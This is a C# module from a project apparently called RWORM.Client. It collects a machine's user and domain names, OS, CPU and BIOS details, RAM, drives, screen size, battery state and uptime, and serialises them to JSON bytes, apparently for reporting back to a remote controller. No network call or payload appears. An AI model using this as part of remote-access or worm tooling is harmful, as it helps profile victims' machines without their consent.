using System;
using System.Globalization;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class SystemInfoDetailed
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_POWER_STATUS
        {
            public byte ACLineStatus;
            public byte BatteryFlag;
            public byte BatteryLifePercent;
            public byte SystemStatusFlag;
            public uint BatteryLifeTime;
            public uint BatteryFullLifeTime;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetSystemPowerStatus(out SYSTEM_POWER_STATUS lpSystemPowerStatus);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GlobalMemoryStatusEx([In, Out] ref MEMORYSTATUSEX lpBuffer);

        [DllImport("kernel32.dll")]
        private static extern ulong GetTickCount64();

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        public static byte[] GetDetailedInfo()
        {
            var sb = new StringBuilder("{");

            
            sb.Append($"\"machine_name\":\"{JsonHelper.Escape(Environment.MachineName)}\",");
            sb.Append($"\"hostname\":\"{JsonHelper.Escape(Environment.MachineName)}\",");
            sb.Append($"\"user_name\":\"{JsonHelper.Escape(Environment.UserName)}\",");
            sb.Append($"\"username\":\"{JsonHelper.Escape(Environment.UserName)}\",");
            sb.Append($"\"domain_name\":\"{JsonHelper.Escape(Environment.UserDomainName)}\",");
            sb.Append($"\"domain\":\"{JsonHelper.Escape(Environment.UserDomainName)}\",");
            sb.Append($"\"os_version\":\"{JsonHelper.Escape(GetFriendlyOSName())}\",");
            sb.Append($"\"osVersion\":\"{JsonHelper.Escape(GetFriendlyOSName())}\",");
            sb.Append($"\"is_64bit\":{(Environment.Is64BitOperatingSystem ? "true" : "false")},");
            sb.Append($"\"is64BitOS\":{(Environment.Is64BitOperatingSystem ? "true" : "false")},");
            sb.Append($"\"processor_count\":{Environment.ProcessorCount},");
            sb.Append($"\"processorCount\":{Environment.ProcessorCount},");

            
            string deviceType = "Desktop PC";
            int batteryPercent = -1;
            string batteryStatus = "No Battery";
            string powerLine = "AC Power";
            bool hasBattery = false;

            if (GetSystemPowerStatus(out SYSTEM_POWER_STATUS status))
            {
                
                if (status.BatteryFlag != 128 && status.BatteryFlag != 255 && status.BatteryFlag != 0)
                {
                    hasBattery = true;
                    deviceType = "Laptop";
                    batteryPercent = (status.BatteryLifePercent <= 100) ? status.BatteryLifePercent : -1;
                }
                else if (status.BatteryLifePercent <= 100 && status.BatteryLifePercent > 0)
                {
                    hasBattery = true;
                    deviceType = "Laptop";
                    batteryPercent = status.BatteryLifePercent;
                }

                if (hasBattery)
                {
                    if ((status.BatteryFlag & 8) != 0) batteryStatus = "Charging";
                    else if ((status.BatteryFlag & 1) != 0) batteryStatus = "High (>66%)";
                    else if ((status.BatteryFlag & 2) != 0) batteryStatus = "Low (<33%)";
                    else if ((status.BatteryFlag & 4) != 0) batteryStatus = "Critical (<5%)";
                    else batteryStatus = "Discharging";
                }

                powerLine = status.ACLineStatus switch
                {
                    1 => "Online (AC Connected)",
                    0 => "Offline (On Battery)",
                    _ => "AC / Unknown"
                };
            }

            
            if (!hasBattery)
            {
                deviceType = DetectChassisDeviceType();
            }

            sb.Append($"\"device_type\":\"{JsonHelper.Escape(deviceType)}\",");
            sb.Append($"\"deviceType\":\"{JsonHelper.Escape(deviceType)}\",");
            sb.Append($"\"has_battery\":{(hasBattery ? "true" : "false")},");
            sb.Append($"\"hasBattery\":{(hasBattery ? "true" : "false")},");
            sb.Append($"\"battery_percent\":{batteryPercent},");
            sb.Append($"\"batteryPercent\":{batteryPercent},");
            sb.Append($"\"battery_status\":\"{JsonHelper.Escape(batteryStatus)}\",");
            sb.Append($"\"chargingStatus\":\"{JsonHelper.Escape(batteryStatus)}\",");
            sb.Append($"\"power_line\":\"{JsonHelper.Escape(powerLine)}\",");

            
            string cpuName = "Unknown CPU";
            string cpuIdentifier = "";
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
                if (key != null)
                {
                    cpuName = key.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? cpuName;
                    cpuIdentifier = key.GetValue("Identifier")?.ToString()?.Trim() ?? "";
                }
            }
            catch { }

            string biosVendor = "";
            string biosVersion = "";
            string biosDate = "";
            try
            {
                using var biosKey = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS");
                if (biosKey != null)
                {
                    biosVendor = biosKey.GetValue("BIOSVendor")?.ToString()?.Trim() ?? "";
                    biosVersion = biosKey.GetValue("BIOSVersion")?.ToString()?.Trim() ?? "";
                    biosDate = biosKey.GetValue("BIOSReleaseDate")?.ToString()?.Trim() ?? "";
                }
            }
            catch { }

            sb.Append($"\"cpu_name\":\"{JsonHelper.Escape(cpuName)}\",");
            sb.Append($"\"cpuName\":\"{JsonHelper.Escape(cpuName)}\",");
            sb.Append($"\"cpu_identifier\":\"{JsonHelper.Escape(cpuIdentifier)}\",");
            sb.Append($"\"bios_vendor\":\"{JsonHelper.Escape(biosVendor)}\",");
            sb.Append($"\"biosVendor\":\"{JsonHelper.Escape(biosVendor)}\",");
            sb.Append($"\"bios_version\":\"{JsonHelper.Escape(biosVersion)}\",");
            sb.Append($"\"biosVersion\":\"{JsonHelper.Escape(biosVersion)}\",");
            sb.Append($"\"bios_date\":\"{JsonHelper.Escape(biosDate)}\",");
            sb.Append($"\"biosDate\":\"{JsonHelper.Escape(biosDate)}\",");

            
            long totalRamMb = 0;
            try
            {
                var mem = new MEMORYSTATUSEX();
                mem.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
                if (GlobalMemoryStatusEx(ref mem) && mem.ullTotalPhys > 0)
                {
                    totalRamMb = (long)(mem.ullTotalPhys / (1024 * 1024));
                }
            }
            catch { }

            if (totalRamMb <= 0)
            {
                totalRamMb = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024 * 1024);
            }

            sb.Append($"\"total_ram_mb\":{totalRamMb},");
            sb.Append($"\"totalRamMb\":{totalRamMb},");

            
            var drivesSb = new StringBuilder("[");
            bool firstDrive = true;
            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (!drive.IsReady) continue;
                    if (!firstDrive) drivesSb.Append(',');
                    firstDrive = false;

                    string name = JsonHelper.Escape(drive.Name);
                    string label = JsonHelper.Escape(drive.VolumeLabel);
                    string format = JsonHelper.Escape(drive.DriveFormat);
                    double totalGb = Math.Round((double)drive.TotalSize / (1024 * 1024 * 1024), 1);
                    double freeGb = Math.Round((double)drive.AvailableFreeSpace / (1024 * 1024 * 1024), 1);

                    string totalGbStr = totalGb.ToString("0.0", CultureInfo.InvariantCulture);
                    string freeGbStr = freeGb.ToString("0.0", CultureInfo.InvariantCulture);

                    drivesSb.Append($"{{\"name\":\"{name}\",\"label\":\"{label}\",\"format\":\"{format}\",\"total_gb\":{totalGbStr},\"totalGb\":{totalGbStr},\"free_gb\":{freeGbStr},\"freeGb\":{freeGbStr}}}");
                }
            }
            catch { }
            drivesSb.Append(']');
            sb.Append($"\"drives\":{drivesSb},");

            
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
            ulong uptimeMs = GetTickCount64();
            long uptimeSeconds = (long)(uptimeMs / 1000);
            TimeSpan uptime = TimeSpan.FromSeconds(uptimeSeconds);
            string uptimeStr = $"{uptime.Days}d {uptime.Hours}h {uptime.Minutes}m {uptime.Seconds}s";

            sb.Append($"\"screen_width\":{screenWidth},");
            sb.Append($"\"screen_height\":{screenHeight},");
            sb.Append($"\"resolution\":\"{screenWidth}x{screenHeight}\",");
            sb.Append($"\"uptime_seconds\":{uptimeSeconds},");
            sb.Append($"\"uptime\":\"{uptimeStr}\"");

            sb.Append('}');
            return Encoding.UTF8.GetBytes(sb.ToString());
        }

        private static string GetFriendlyOSName()
        {
            try
            {
                using var cvKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                if (cvKey != null)
                {
                    string prod = cvKey.GetValue("ProductName")?.ToString() ?? "";
                    string build = cvKey.GetValue("CurrentBuild")?.ToString() ?? "";
                    string displayVer = cvKey.GetValue("DisplayVersion")?.ToString() ?? "";
                    if (!string.IsNullOrEmpty(prod))
                    {
                        if (int.TryParse(build, out int b) && b >= 22000 && prod.Contains("Windows 10"))
                        {
                            prod = prod.Replace("Windows 10", "Windows 11");
                        }
                        return $"{prod} {displayVer} (Build {build})".Trim();
                    }
                }
            }
            catch { }
            return Environment.OSVersion.VersionString;
        }

        private static string DetectChassisDeviceType()
        {
            try
            {
                using var sysKey = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS");
                if (sysKey != null)
                {
                    string systemFamily = sysKey.GetValue("SystemFamily")?.ToString()?.ToLowerInvariant() ?? "";
                    string systemSku = sysKey.GetValue("SystemSKU")?.ToString()?.ToLowerInvariant() ?? "";

                    if (systemFamily.Contains("laptop") || systemFamily.Contains("notebook") ||
                        systemSku.Contains("laptop") || systemSku.Contains("notebook"))
                    {
                        return "Laptop";
                    }
                }
            }
            catch { }
            return "Desktop PC";
        }
    }
}
